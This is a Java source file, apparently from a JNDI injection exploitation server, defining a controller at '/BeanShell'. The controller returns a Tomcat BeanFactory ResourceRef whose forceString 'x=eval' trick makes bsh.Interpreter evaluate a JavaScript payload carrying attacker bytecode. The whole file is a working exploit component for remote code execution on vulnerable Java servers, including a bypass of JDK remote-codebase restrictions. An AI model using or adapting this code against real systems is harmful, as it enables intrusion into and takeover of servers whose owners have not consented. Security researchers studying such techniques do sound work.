package map.jndi.controller.bypass;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JavaScriptPayload;
import map.jndi.util.MiscUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/BeanShell")
public class BeanShellController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + BeanShell");

        String code = JavaScriptPayload.loadClass(byteCode);

        ResourceRef ref = new ResourceRef("bsh.Interpreter", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + MiscUtil.encodeUnicode(code) + "\");"));

        return ref;
    }
}
